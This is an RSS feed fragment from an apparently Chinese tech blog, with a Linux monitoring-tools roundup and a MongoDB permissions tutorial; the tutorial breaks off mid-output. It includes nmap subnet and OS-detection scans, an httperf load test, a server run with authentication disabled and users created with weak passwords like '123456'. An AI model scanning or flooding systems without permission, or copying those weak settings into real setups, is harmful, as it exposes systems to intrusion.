            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;1、查看进程占用带宽情况-Nethogs&lt;/p&gt;
&lt;p&gt;Nethogs 是一个终端下的网络流量监控工具可以直观的显示每个进程占用的带宽。&lt;br&gt;下载：&lt;a href=&#34;http://sourceforge.net/projects/nethogs/files/nethogs/0.8/nethogs-0.8.0.tar.gz/download&#34;&gt;http://sourceforge.net/projects/nethogs/files/nethogs/0.8/nethogs-0.8.0.tar.gz/download&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum -y install libpcap-devel ncurses-devel
tar zxvf nethogs-0.8.0.tar.gz
cd nethogs
make &amp;amp;&amp;amp; make install
nethogs eth0
&lt;/code&gt;&lt;/pre&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;2、硬盘读取性能测试-IOZone&lt;/p&gt;
&lt;p&gt;IOZone是一款Linux文件系统性能测试工具 可以测试不同的操作系统中文件系统的读写性能。&lt;br&gt;下载：&lt;a href=&#34;http://www.iozone.org/src/current/&#34;&gt;http://www.iozone.org/src/current/&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar xvf iozone3_420.tar
cd iozone3_420/src/current/
make linux
./iozone -a -n 512m -g 16g -i 0 -i 1 -i 5 -f /mnt/iozone -Rb ./iozone.xls
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;a使用全自动模式&lt;/li&gt;
&lt;li&gt;n为自动模式设置最小文件大小(Kbytes)。&lt;/li&gt;
&lt;li&gt;g设置自动模式可使用的最大文件大小Kbytes。&lt;/li&gt;
&lt;li&gt;i用来指定运行哪个测试。&lt;/li&gt;
&lt;li&gt;f指定测试文件的名字完成后自动删除&lt;/li&gt;
&lt;li&gt;R产生Excel到标准输出&lt;/li&gt;
&lt;li&gt;b指定输出到指定文件上&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、实时监控磁盘IO-IOTop&lt;/p&gt;
&lt;p&gt;IOTop命令是专门显示硬盘IO的命令,界面风格类似top命令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    yum -y install iotop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4、网络流量监控-IPtraf&lt;/p&gt;
&lt;p&gt;IPtraf是一个运行在Linux下的简单的网络状况分析工具。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum -y install iptraf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5、网络流量监控-IFTop&lt;/p&gt;
&lt;p&gt;iftop是类似于linux下面top的实时流量监控工具。比iptraf直观些。&lt;br&gt;下载：&lt;a href=&#34;http://www.ex-parrot.com/~pdw/iftop/&#34;&gt;http://www.ex-parrot.com/~pdw/iftop/&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar zxvf iftop-0.17.tar.gz
cd iftop-0.17
./configure
make &amp;amp;&amp;amp; make install

iftop 
iftop -i eth0 
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;指定监控网卡接口&#34;&gt;&lt;a href=&#34;#指定监控网卡接口&#34; class=&#34;headerlink&#34; title=&#34;指定监控网卡接口&#34;&gt;&lt;/a&gt;指定监控网卡接口&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;TX：发送流量&lt;/li&gt;
&lt;li&gt;RX：接收流量&lt;/li&gt;
&lt;li&gt;TOTAL：总流量&lt;/li&gt;
&lt;li&gt;Cumm：运行iftop到目前时间的总流量&lt;/li&gt;
&lt;li&gt;peak：流量峰值&lt;/li&gt;
&lt;li&gt;rates：分别表示过去 2s 10s 40s 的平均流量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;6、进程实时监控-HTop&lt;/p&gt;
&lt;p&gt;HTop是一个 Linux 下的交互式的进程浏览器可以用来替换Linux下的top命令。&lt;br&gt;rpm -ivh &lt;a href=&#34;http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）&#34;&gt;http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum -y install htop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;7、系统资源监控-NMON&lt;/p&gt;
&lt;p&gt;NMON是一种在AIX与各种Linux操作系统上广泛使用的监控与分析工具&lt;br&gt;下载：&lt;a href=&#34;http://sourceforge.jp/projects/sfnet_nmon/releases/&#34;&gt;http://sourceforge.jp/projects/sfnet_nmon/releases/&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod +x nmon_x86_64_rhel6
mv nmon_x86_64_rhel6 /usr/sbin/nmon
nmon
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;8、监控多个日志-MultiTail&lt;/p&gt;
&lt;p&gt;MultiTail是在控制台打开多个窗口用来实现同时监控多个日志文档、类似tail命令的功能的软件。&lt;br&gt;rpm -ivh &lt;a href=&#34;http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm&#34;&gt;http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm&lt;/a&gt; （安装第三方YUM源）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  yum -y install multitail
  multitail -e &amp;quot;fail&amp;quot; /var/log/secure #筛选关键字进行监控
  multitail -l &amp;quot;ping baidu.com&amp;quot; #监控后面的命令-l将要执行的命令
  multitail -i /var/log/messages -i /var/log/secure #-i指定一个文件名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;9、SSH暴力破解防护-Fail2ban&lt;/p&gt;
&lt;p&gt;Fail2ban可以监视你的系统日志然后匹配日志的错误信息正则式匹配执行相应的屏蔽动作一般情况下是调用防火墙屏蔽&lt;br&gt;下载：&lt;a href=&#34;http://www.fail2ban.org/wiki/index.php/Downloads&#34;&gt;http://www.fail2ban.org/wiki/index.php/Downloads&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd fail2ban-0.8.11
python setup.py install
cd files/
cp ./redhat-initd /etc/init.d/fail2ban
service fail2ban start
chkconfig --add fail2ban
chkconfig fail2ban on
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注：需要配置iptables实用，如果重启iptables了也要重启fail2ban，因为fail2ban的原理是调用iptables实时阻挡外界的攻击。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;grep -v &amp;quot;^#&amp;quot; /etc/fail2ban/jail.conf | grep -v &amp;quot;^$&amp;quot; [DEFAULT]
ignoreip = 127.0.0.1/8#忽略本机IP
bantime = 600   #符合规则后封锁时间
findtime = 600  #在多长时间内符合规则执行封锁如600秒达到3次则执行
maxretry = 3    #最大尝试次数
backend = auto #日志修改检测日志gamin、polling和auto这三种
usedns = warn [ssh-iptables]
enabled = true#默认是禁用
false filter = sshd action = iptables[name=SSH, port=ssh, protocol=tcp] # sendmail-whois[name=SSH,dest=收件人邮箱, sender=发件人邮箱, sendername=&amp;quot;Fail2Ban&amp;quot;] logpath = /var/log/sshd.log #响应的错误日志一般在/var/log/secure maxretry = 5 #尝试错误次数覆盖全局中的maxretry
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注：默认所有的应用防护都是关闭的，需要我们手动开启。fail2ban.conf文件是日志信息，jail.conf文件是保护的具体服务和动作配置信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;touch /var/log/sshd.log
service fail2ban restart
fail2ban-client status #查看监控已经开启 Status |- Number of jail: 1 `- Jail list: ssh-iptables
iptables -L #iptables过滤表有fail2ban一条规则 fail2ban-SSH tcp -- anywhere anywhere tcp dpt:ssh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;10、连接会话终端持续化-Tmux&lt;/p&gt;
&lt;p&gt;Tmux是一个优秀的终端复用软件类似GNU Screen比Screen更加方面、灵活和高效。为了确保连接SSH时掉线不影响任务运行。&lt;br&gt;rpm -ivh &lt;a href=&#34;http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）&#34;&gt;http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;11、页面显示磁盘空间使用情况-Agedu&lt;/p&gt;
&lt;p&gt;下载：&lt;a href=&#34;http://www.chiark.greenend.org.uk/~sgtatham/agedu/&#34;&gt;http://www.chiark.greenend.org.uk/~sgtatham/agedu/&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar zxvf agedu-r9723.tar.gz
cd agedu-r9723
./configure
make &amp;amp;&amp;amp; make install
agedu -s / #-s扫描
agedu -w --address 192.168.0.10:80 #-w输入一个网页链接
agedu -w --address 192.168.0.108080 --auth none #--auth关闭认证如果不加端口号会生成一个随机的用浏览器访问
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;12、安全扫描工具-NMap&lt;/p&gt;
&lt;p&gt;NMap是Linux下的网络连接扫描和嗅探工具包用来扫描网上电脑开放的网络连接端。&lt;br&gt;下载：&lt;a href=&#34;http://nmap.org/download.html&#34;&gt;http://nmap.org/download.html&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar jxvf nmap-6.40.tar.bz2
./configure
make &amp;amp;&amp;amp; make install
nmap 192.168.0.10 #获取基本信息
nmap -O 192.168.0.10 #获取系统版本信息
nmap -A 192.168.0.10 #获取系统综合信息
nmap 192.168.0.0/24 #获取一个网段工作设备基本信息
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;-sSTCP扫描&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;-sV系统版本检测&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;13、Web压力测试-Httperf&lt;/p&gt;
&lt;p&gt;Httperf比ab更强大，能测试出web服务能承载的最大服务量及发现潜在问题；比如：内存使用、稳定性。最大优势：可以指定规律进行压力测试，模拟真实环境。&lt;br&gt;下载：&lt;a href=&#34;http://code.google.com/p/httperf/downloads/list&#34;&gt;http://code.google.com/p/httperf/downloads/list&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar zxvf httperf-0.9.0.tar.gz
cd httperf-0.9.0
./configure
make &amp;amp;&amp;amp; make install
httperf --hog --server=192.168.0.202 --uri=/index.html --num-conns=10000 --wsess=10,10,0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参数说明：    &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;—hog：让httperf尽可能多产生连接，httperf会根据硬件配置，有规律的产生访问连接；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;—num-conns：连接数量，总发起10000请求；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;—wsess： 用户打开网页时间规律模拟，第一个10表示产生10个会话连接，第二个10表示每个会话连接进行10次请求，0.1表示每个会话连接请求之间的间隔时间/s。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/g7BksCQuTbwUorspGR7mcQ&#34;&gt;https://mp.weixin.qq.com/s/g7BksCQuTbwUorspGR7mcQ&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2020/06/20/mongodb-user-rbc/</guid>
            <title>MongoDB权限说明</title>
            <link>https://erik.xyz/2020/06/20/mongodb-user-rbc/</link>
            <category>mongodb</category>
            <category>mongodb权限</category>
            <pubDate>Sat, 20 Jun 2020 15:31:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;权限误区  并不是说下面的排序就证明权限越来越大除了readWrite权限用户外(root权限用户也包括)，其它用户都不具备对数据库的写入权限，除 read 权限外，其它用户都不具备对数据库中的读权限，每个权限的功能各不一样(除root外)&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h4 id=&#34;普通用户&#34;&gt;&lt;a href=&#34;#普通用户&#34; class=&#34;headerlink&#34; title=&#34;普通用户&#34;&gt;&lt;/a&gt;普通用户&lt;/h4&gt;&lt;p&gt;普通用户只是拥有下面的读写权限&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;权限&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Read&lt;/td&gt;
&lt;td&gt;允许用户读取指定数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;readWrite&lt;/td&gt;
&lt;td&gt;允许用户读写指定数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h4 id=&#34;管理用户&#34;&gt;&lt;a href=&#34;#管理用户&#34; class=&#34;headerlink&#34; title=&#34;管理用户&#34;&gt;&lt;/a&gt;管理用户&lt;/h4&gt;&lt;p&gt;管理用户具备下面说明的一些操作权限&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;权限&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;dbAdmin&lt;/td&gt;
&lt;td&gt;允许用户在指定数据库中指定管理函数，如(索引创建、删除、查看统计访问system.profile)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;userAdmin&lt;/td&gt;
&lt;td&gt;允许用户向system.users集合写入，可以找指定数据里面创建、删除和管理用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;clusterAdmin&lt;/td&gt;
&lt;td&gt;只在admin数据库中可用，赋予用户所有分片和复制集相关函数的管理权限&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h4 id=&#34;授权用户&#34;&gt;&lt;a href=&#34;#授权用户&#34; class=&#34;headerlink&#34; title=&#34;授权用户&#34;&gt;&lt;/a&gt;授权用户&lt;/h4&gt;&lt;p&gt;以下用户主要是为其它用户赋予相应的权限&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;权限&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;readAnyDatabase&lt;/td&gt;
&lt;td&gt;只在admin数据库中可用，赋予用户所有数据库的读权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;readWriteAnyDatabase&lt;/td&gt;
&lt;td&gt;只在admin数据库中可用，赋予用户所有数据库的读写权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;userWriteAnyDatabase&lt;/td&gt;
&lt;td&gt;只在admin数据库中可用，赋予用户所有数据库的userAdmin权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dbAdminAnyDatabase&lt;/td&gt;
&lt;td&gt;只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h4 id=&#34;超级管理员&#34;&gt;&lt;a href=&#34;#超级管理员&#34; class=&#34;headerlink&#34; title=&#34;超级管理员&#34;&gt;&lt;/a&gt;超级管理员&lt;/h4&gt;&lt;p&gt;可以无所不能，为所欲为&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;权限&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;root&lt;/td&gt;
&lt;td&gt;只在admin数据库中可用，超级管理员&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mongodb&lt;/td&gt;
&lt;td&gt;安装好后第一次进入是不需要密码的，也没有任何用户，直接连接进入即可&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;/usr/local/mongodb/bin/mongo —host 192.168.31.215 —port 27018&lt;/p&gt;
&lt;h4 id=&#34;创建管理用户&#34;&gt;&lt;a href=&#34;#创建管理用户&#34; class=&#34;headerlink&#34; title=&#34;创建管理用户&#34;&gt;&lt;/a&gt;创建管理用户&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;    &amp;gt; use admin
    switched to db admin
    &amp;gt; db.createUser ( &amp;#123;
       user: &amp;quot;manage&amp;quot;,
       pwd: &amp;quot;123456&amp;quot;,
       roles: [ &amp;#123; role: &amp;quot;root&amp;quot;, db: &amp;quot;admin&amp;quot; &amp;#125; ]
       &amp;#125;
    )

    #返回以下信息代表创建成功
    Successfully added user: &amp;#123;
        &amp;quot;user&amp;quot;: &amp;quot;manage&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;root&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;
            &amp;#125;
        ]
    &amp;#125;
    退出登录，然后在mongodb配置文件中开启认证

    vim /usr/local/mongodb/27018/conf/mongod.conf
    security: 
      authorization: enabled
      javascriptEnabled: true
    重启mongodb

    /usr/local/mongodb/bin/mongod --shutdown -f /usr/local/mongodb/27018/conf/mongod.conf 
    /usr/local/mongodb/bin/mongod -f /usr/local/mongodb/27018/conf/mongod.conf
    连接mongodb

    /usr/local/mongodb/bin/mongo --host 192.168.31.215 --port 27018
    MongoDB shell version v4.2.0
    connecting to: mongodb: //192.168.31.215: 27018/?compressors=disabled&amp;amp;gssapiServiceName=mongodb
    Implicit session: session &amp;#123; &amp;quot;id&amp;quot;: UUID(&amp;quot;fc77266a-b2ff-4eb0-b6ca-c493c7c29143&amp;quot;) &amp;#125;
    MongoDB server version: 4.2.0
    &amp;gt; use admin                     #进入admin库中先进行账号认证
    switched to db admin        
    &amp;gt; db.auth(&amp;#39;manage&amp;#39;,&amp;#39;123456&amp;#39;)    #认证账号，值返回1代表认证成功1
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;mongdb库创建读写用户&#34;&gt;&lt;a href=&#34;#mongdb库创建读写用户&#34; class=&#34;headerlink&#34; title=&#34;mongdb库创建读写用户&#34;&gt;&lt;/a&gt;mongdb库创建读写用户&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;    &amp;gt; db.createUser( &amp;#123;
    ... user: &amp;quot;zhangsan&amp;quot;,
    ... pwd: &amp;quot;zhangsan&amp;quot;,
    ... roles: [ &amp;#123; role: &amp;quot;readWrite&amp;quot;, db: &amp;quot;mongdb&amp;quot; &amp;#125; ]
    ...     &amp;#125;
    ... )
    Successfully added user: &amp;#123;
        &amp;quot;user&amp;quot;: &amp;quot;zhangsan&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;readWrite&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;mongdb&amp;quot;
            &amp;#125;
        ]
    &amp;#125;
    验证创建的zhangsan用户(不需要退出登录)

    &amp;gt; use admin
    switched to db admin
    &amp;gt; db.auth(&amp;#39;zhangsan&amp;#39;,&amp;#39;zhangsan&amp;#39;)
    1
    &amp;gt; show dbs              #查看数据库，因为mongdb数据库存储数据，所以看不到
    &amp;gt; use mongdb            #直接 use 到mongdb数据库中
    switched to db mongdb

    #插入 json 格式文档到 coll 集合中
    &amp;gt; db.coll.insert(&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;Zhangsan&amp;quot;,&amp;quot;url&amp;quot;: &amp;quot;http: //abcops.cn&amp;quot;,&amp;quot;age&amp;quot;: 25,&amp;quot;isNonProfit&amp;quot;: true,&amp;#125;)
    WriteResult(&amp;#123; &amp;quot;nInserted&amp;quot;: 1 &amp;#125;)
    &amp;gt; show collections      #查看已存在集合
    coll
    &amp;gt; db.coll.find()        #读取集合中的数据
    &amp;#123; &amp;quot;_id&amp;quot;: ObjectId(&amp;quot;5d8b24c2f1c33f4950f2c5df&amp;quot;), &amp;quot;name&amp;quot;: &amp;quot;Zhangsan&amp;quot;, &amp;quot;url&amp;quot;: &amp;quot;http: //abcops.cn&amp;quot;, &amp;quot;age&amp;quot;: 25, &amp;quot;isNonProfit&amp;quot;: true &amp;#125;
    以上完成了读写权限的验证

    一个用户多个权限

    为 lisi 用户授权 01db read权限 02db readWrite 03db dbAdmin权限 04db userAdmin权限
    这次先把数据库创建出来

    &amp;gt; use admin
    switched to db admin
    &amp;gt; db.auth(&amp;#39;manage&amp;#39;,&amp;#39;123456&amp;#39;)
    1

    &amp;gt; use 01db
    switched to db 01db
    &amp;gt; db.coll.insert(&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;01db&amp;quot;,&amp;quot;url&amp;quot;: &amp;quot;http: //abcops.cn&amp;quot;,&amp;quot;age&amp;quot;: 25,&amp;quot;isNonProfit&amp;quot;: true,&amp;#125;)
    WriteResult(&amp;#123; &amp;quot;nInserted&amp;quot;: 1 &amp;#125;)

    &amp;gt; use 02db
    switched to db 02db
    &amp;gt; db.coll.insert(&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;02db&amp;quot;,&amp;quot;url&amp;quot;: &amp;quot;http: //abcops.cn&amp;quot;,&amp;quot;age&amp;quot;: 25,&amp;quot;isNonProfit&amp;quot;: true,&amp;#125;)
    WriteResult(&amp;#123; &amp;quot;nInserted&amp;quot;: 1 &amp;#125;)

    &amp;gt; use 03db
    switched to db 03db
    &amp;gt; db.coll.insert(&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;03db&amp;quot;,&amp;quot;url&amp;quot;: &amp;quot;http: //abcops.cn&amp;quot;,&amp;quot;age&amp;quot;: 25,&amp;quot;isNonProfit&amp;quot;: true,&amp;#125;)
    WriteResult(&amp;#123; &amp;quot;nInserted&amp;quot;: 1 &amp;#125;)

    &amp;gt; use 04db
    switched to db 04db
    &amp;gt; db.coll.insert(&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;04db&amp;quot;,&amp;quot;url&amp;quot;: &amp;quot;http: //abcops.cn&amp;quot;,&amp;quot;age&amp;quot;: 25,&amp;quot;isNonProfit&amp;quot;: true,&amp;#125;)
    WriteResult(&amp;#123; &amp;quot;nInserted&amp;quot;: 1 &amp;#125;)
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;创建用户并授权&#34;&gt;&lt;a href=&#34;#创建用户并授权&#34; class=&#34;headerlink&#34; title=&#34;创建用户并授权&#34;&gt;&lt;/a&gt;创建用户并授权&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;    &amp;gt; db.createUser( &amp;#123;
    ... user: &amp;quot;lisi&amp;quot;,
    ... pwd: &amp;quot;123456&amp;quot;,
    ... roles: [ &amp;#123; role: &amp;quot;read&amp;quot;,db: &amp;quot;01db&amp;quot; &amp;#125;,
    ... &amp;#123; role: &amp;quot;readWrite&amp;quot;,db: &amp;quot;02db&amp;quot; &amp;#125;,
    ... &amp;#123; role: &amp;quot;dbAdmin&amp;quot;,db: &amp;quot;03db&amp;quot; &amp;#125;,
    ... &amp;#123; role: &amp;quot;userAdmin&amp;quot;,db: &amp;quot;04db&amp;quot; &amp;#125; ]
    ...     &amp;#125;
    ... )
    Successfully added user: &amp;#123;
        &amp;quot;user&amp;quot;: &amp;quot;lisi&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;read&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;01db&amp;quot;
            &amp;#125;,
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;readWrite&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;02db&amp;quot;
            &amp;#125;,
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;dbAdmin&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;03db&amp;quot;
            &amp;#125;,
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;userAdmin&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;04db&amp;quot;
            &amp;#125;
        ]
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;查看所有用户&#34;&gt;&lt;a href=&#34;#查看所有用户&#34; class=&#34;headerlink&#34; title=&#34;查看所有用户&#34;&gt;&lt;/a&gt;查看所有用户&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;    &amp;gt; show users
    &amp;#123;
        &amp;quot;_id&amp;quot;: &amp;quot;admin.admin&amp;quot;,
        &amp;quot;userId&amp;quot;: UUID(&amp;quot;9958faa5-7132-4146-8775-a001e47fe7f8&amp;quot;),
        &amp;quot;user&amp;quot;: &amp;quot;admin&amp;quot;,
        &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;root&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;
            &amp;#125;
        ],
        &amp;quot;mechanisms&amp;quot;: [
            &amp;quot;SCRAM-SHA-1&amp;quot;
        ]
    &amp;#125;
    &amp;#123;
        &amp;quot;_id&amp;quot;: &amp;quot;admin.lisi&amp;quot;,
        &amp;quot;userId&amp;quot;: UUID(&amp;quot;bc8e5dc7-2f8c-40c1-8190-cea4951ae4a1&amp;quot;),
        &amp;quot;user&amp;quot;: &amp;quot;lisi&amp;quot;,
        &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;read&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;01db&amp;quot;
            &amp;#125;,
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;readWrite&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;02db&amp;quot;
            &amp;#125;,
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;dbAdmin&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;03db&amp;quot;
            &amp;#125;,
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;userAdmin&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;04db&amp;quot;
            &amp;#125;
        ],
        &amp;quot;mechanisms&amp;quot;: [
            &amp;quot;SCRAM-SHA-1&amp;quot;
        ]
    &amp;#125;
    &amp;#123;
        &amp;quot;_id&amp;quot;: &amp;quot;admin.manage&amp;quot;,
        &amp;quot;userId&amp;quot;: UUID(&amp;quot;e1b34f57-06f2-4ef1-b23a-2d46a3964fbf&amp;quot;),
        &amp;quot;user&amp;quot;: &amp;quot;manage&amp;quot;,
        &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;root&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;
            &amp;#125;
        ],
        &amp;quot;mechanisms&amp;quot;: [
            &amp;quot;SCRAM-SHA-1&amp;quot;
        ]
    &amp;#125;
    &amp;#123;
        &amp;quot;_id&amp;quot;: &amp;quot;admin.micvs&amp;quot;,
        &amp;quot;userId&amp;quot;: UUID(&amp;quot;1f4837c7-8c14-40d4-8a21-d621e0bcc278&amp;quot;),
        &amp;quot;user&amp;quot;: &amp;quot;micvs&amp;quot;,
        &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;dbAdminAnyDatabase&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;
            &amp;#125;
        ],
        &amp;quot;mechanisms&amp;quot;: [
            &amp;quot;SCRAM-SHA-1&amp;quot;,
            &amp;quot;SCRAM-SHA-256&amp;quot;
        ]
    &amp;#125;
    &amp;#123;
        &amp;quot;_id&amp;quot;: &amp;quot;admin.zhangsan&amp;quot;,
        &amp;quot;userId&amp;quot;: UUID(&amp;quot;1003726b-c7fc-44e6-b001-b5c828bfb40d&amp;quot;),
        &amp;quot;user&amp;quot;: &amp;quot;zhangsan&amp;quot;,
        &amp;quot;db&amp;quot;: &amp;quot;admin&amp;quot;,
        &amp;quot;roles&amp;quot;: [
            &amp;#123;
                &amp;quot;role&amp;quot;: &amp;quot;readWrite&amp;quot;,
                &amp;quot;db&amp;quot;: &amp;quot;mongdb&amp;quot;
